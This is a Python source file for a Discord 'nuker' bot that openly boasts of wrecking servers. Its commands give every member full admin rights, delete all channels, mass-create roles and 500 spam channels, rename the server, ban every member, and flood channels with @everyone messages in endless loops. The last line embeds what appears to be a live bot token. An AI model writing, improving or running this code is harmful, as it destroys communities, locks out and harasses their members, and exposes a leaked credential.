import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import json
from threading import Thread
import requests
from discord.utils import get


intents = discord.Intents.default()
intents.members = True

SPAM_CHANNEL = ["Nuked by THE USSR", "THE USSR RUNS U", "DONT FUCK WITH THE USSR"]
SPAM_MESSAGE = ["@everyone Server nuked by THE USSR", "THE USSR RUNS YOU", "@everyone"]
webhook_usernames = [
    "Oops wrong command", "THE USSRbot", "THE USSR RUNS U",
    "THE USSR"
]
client = commands.Bot(command_prefix="?", intents=intents)




@client.event
async def on_ready():
    print('''

▒██   ██▒▓█████  ███▄    █  ▒█████
▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██▒  ██▒
░░  █   ░▒███   ▓██  ▀█ ██▒▒██░  ██▒
 ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░
▒██▒ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░
▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░
░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░
 ░    ░     ░      ░   ░ ░ ░ ░ ░ ▒
 ░    ░     ░  ░         ░     ░ ░

Ready to fuck up servers <3

 ''')
    await client.change_presence(activity=discord.Game(name="GET FUCKED BY THE USSR"))


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def USSRnuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print("admin gaven to all members")
    except:
        print("i failed to give everyone admin")
    for channel in guild.channels:
        try:
            await channel.delete()
            print("DELETING CHANNELS")
        except:
            print("failed to delete a channel")
    for role in guild.roles:
        try:
            await ctx.guild.create_role(name="THE USSR NUKER ON TOP")
            print("Spamming roles <3")
        except:
            print("failed to spam a role")
    await guild.create_text_channel("NUKED BY THE USSR")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return
@client.command()
async def USSRspam(ctx):
    while True:
        await ctx.message.delete()
        await ctx.guild.create_role(name="THE USSR NUKER ON TOP")
        print("Spamming roles")

@client.command()
async def USSRname(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await ctx.guild.edit(name="SERVER NUKED BY THE USSR")
    print("NAME CHANGED")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()

@client.command()
async def USSRban(ctx):
 await ctx.message.delete()
 print("Banned All Members ")
 for user in ctx.guild.members:
        try:
            await user.ban()
        except:
           pass

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

client.run("ODc1MjQ0NzI5MjU4OTAxNTA0.+" + "YRStLA." + "ETSi0E0DPg16k1cKTEpTduwG0-c")
